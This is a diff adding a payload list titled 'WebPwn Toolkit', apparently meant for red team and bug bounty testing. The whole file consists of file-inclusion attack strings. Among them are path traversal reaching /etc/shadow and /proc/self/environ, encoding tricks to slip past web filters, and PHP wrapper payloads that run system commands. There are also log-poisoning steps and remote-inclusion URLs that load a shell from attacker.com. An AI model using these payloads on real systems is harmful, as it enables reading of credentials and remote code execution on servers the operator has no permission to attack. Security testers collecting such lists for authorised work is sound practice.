@@ -1,0 +1,140 @@
+# ============================================================
+# WebPwn Toolkit - Advanced LFI / RFI Payloads
+# Level: Advanced / Red Team / Bug Bounty
+# ============================================================
+
+# ──────────────────────────────────────────
+# [1] BASIC LFI
+# ──────────────────────────────────────────
+../etc/passwd
+../../etc/passwd
+../../../etc/passwd
+../../../../etc/passwd
+../../../../../etc/passwd
+../../../../../../etc/passwd
+../../../../../../../etc/passwd
+../../../../../../../../etc/passwd
+../../../../../../../../../etc/passwd
+../../../../../../../../../../etc/passwd
+
+# ──────────────────────────────────────────
+# [2] NULL BYTE (PHP < 5.3.4)
+# ──────────────────────────────────────────
+../etc/passwd%00
+../../etc/passwd%00
+../../../etc/passwd%00
+../../../../etc/passwd%00
+../etc/passwd\0
+../../etc/passwd\0
+
+# ──────────────────────────────────────────
+# [3] WINDOWS PATH TRAVERSAL
+# ──────────────────────────────────────────
+..\windows\win.ini
+..\..\windows\win.ini
+..\..\..\windows\win.ini
+..\..\..\..\windows\win.ini
+../windows/win.ini
+../../windows/win.ini
+../../../windows/win.ini
+../../../../windows/win.ini
+..\boot.ini
+..\..\boot.ini
+C:\Windows\win.ini
+C:\boot.ini
+C:\Windows\System32\drivers\etc\hosts
+
+# ──────────────────────────────────────────
+# [4] WAF BYPASS
+# ──────────────────────────────────────────
+# Encoding
+..%2fetc%2fpasswd
+..%2F..%2Fetc%2Fpasswd
+%2e%2e%2fetc%2fpasswd
+%2e%2e%2f%2e%2e%2fetc%2fpasswd
+%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
+# Double encoding
+..%252fetc%252fpasswd
+%252e%252e%252fetc%252fpasswd
+# Unicode encoding
+..%c0%af..%c0%afetc%c0%afpasswd
+..%c0%af..%c0%af..%c0%afetc%c0%afpasswd
+..%c1%9c..%c1%9cetc%c1%9cpasswd
+# Extra dots bypass
+....//etc/passwd
+....//....//etc/passwd
+..../etc/passwd
+....//..../etc/passwd
+# Mixed slashes
+..\../etc/passwd
+../..\etc/passwd
+# URL encoded dots
+%2e%2e/etc/passwd
+%2e%2e/%2e%2e/etc/passwd
+
+# ──────────────────────────────────────────
+# [5] SENSITIVE FILES (LINUX)
+# ──────────────────────────────────────────
+../../../../etc/passwd
+../../../../etc/shadow
+../../../../etc/group
+../../../../etc/hosts
+../../../../etc/hostname
+../../../../etc/os-release
+../../../../etc/mysql/my.cnf
+../../../../etc/apache2/apache2.conf
+../../../../etc/nginx/nginx.conf
+../../../../etc/ssh/sshd_config
+../../../../etc/crontab
+../../../../proc/version
+../../../../proc/self/environ
+../../../../proc/self/cmdline
+../../../../proc/net/tcp
+../../../../var/log/apache2/access.log
+../../../../var/log/apache2/error.log
+../../../../var/log/nginx/access.log
+../../../../var/log/nginx/error.log
+../../../../var/log/auth.log
+../../../../var/log/syslog
+../../../../tmp/sess_SESSIONID
+../../../../var/lib/php/sessions/sess_SESSIONID
+
+# ──────────────────────────────────────────
+# [6] PHP WRAPPERS
+# ──────────────────────────────────────────
+php://filter/convert.base64-encode/resource=index.php
+php://filter/convert.base64-encode/resource=config.php
+php://filter/convert.base64-encode/resource=../../etc/passwd
+php://filter/read=string.rot13/resource=index.php
+php://filter/read=convert.iconv.UTF-8.UTF-16LE/resource=index.php
+php://input
+php://stdin
+data://text/plain,<?php system('id');?>
+data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOz8+
+expect://id
+expect://whoami
+zip://archive.zip#file.php
+phar://archive.phar/file.php
+
+# ──────────────────────────────────────────
+# [7] LOG POISONING (LFI → RCE)
+# ──────────────────────────────────────────
+# First inject PHP into User-Agent then include log
+../../../../var/log/apache2/access.log
+../../../../var/log/apache2/error.log
+../../../../var/log/nginx/access.log
+../../../../var/log/auth.log
+# SSH log poisoning
+../../../../var/log/auth.log
+
+# ──────────────────────────────────────────
+# [8] REMOTE FILE INCLUSION (RFI)
+# ──────────────────────────────────────────
+http://attacker.com/shell.txt
+http://attacker.com/shell.php
+https://attacker.com/shell.txt
+http://attacker.com/shell.txt?
+http://attacker.com/shell.txt%00
+ftp://attacker.com/shell.txt
+\\attacker.com\share\shell.php
+//attacker.com/shell.txt
